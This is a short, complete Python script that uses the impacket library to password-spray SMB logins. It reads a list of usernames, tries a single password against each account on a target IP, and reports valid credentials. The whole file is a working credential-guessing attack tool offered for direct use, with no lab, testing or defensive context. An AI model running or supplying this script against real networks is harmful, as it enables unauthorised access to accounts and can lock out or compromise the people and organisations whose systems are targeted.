#!/usr/bin/env python3
"""
Simple SMB password spray script using impacket.
Usage: python3 smb_spray.py <target_ip> <users.txt> <password> [domain]
"""

import sys
from impacket.smbconnection import SMBConnection
from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_ACCOUNT_DISABLED

def try_login(target, username, password, domain=""):
    try:
        conn = SMBConnection(target, target)
        conn.login(username, password, domain)
        conn.close()
        return True, None
    except Exception as e:
        return False, str(e)


def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <users.txt> <password> [domain]")
        sys.exit(1)

    target = sys.argv[1]
    userfile = sys.argv[2]
    password = sys.argv[3]
    domain = sys.argv[4] if len(sys.argv) > 4 else ""

    with open(userfile, "r") as f:
        # strip handles trailing \r too, so CRLF files won't break this
        users = [line.strip() for line in f if line.strip()]

    print(f"[*] Target: {target}  Domain: {domain or '(none)'}  Password: {password}")
    print(f"[*] Loaded {len(users)} users from {userfile}\n")

    hits = []
    for user in users:
        ok, err = try_login(target, user, password, domain)
        if ok:
            print(f"[+] SUCCESS: {user}:{password}")
            hits.append(user)
        else:
            # Keep it short; print full err if you want more detail while debugging
            reason = err.split(",")[0] if err else "unknown error"
            print(f"[-] fail:    {user}  ({reason})")

    print(f"\n[*] Done. {len(hits)} valid login(s): {hits}")


if __name__ == "__main__":
    main()
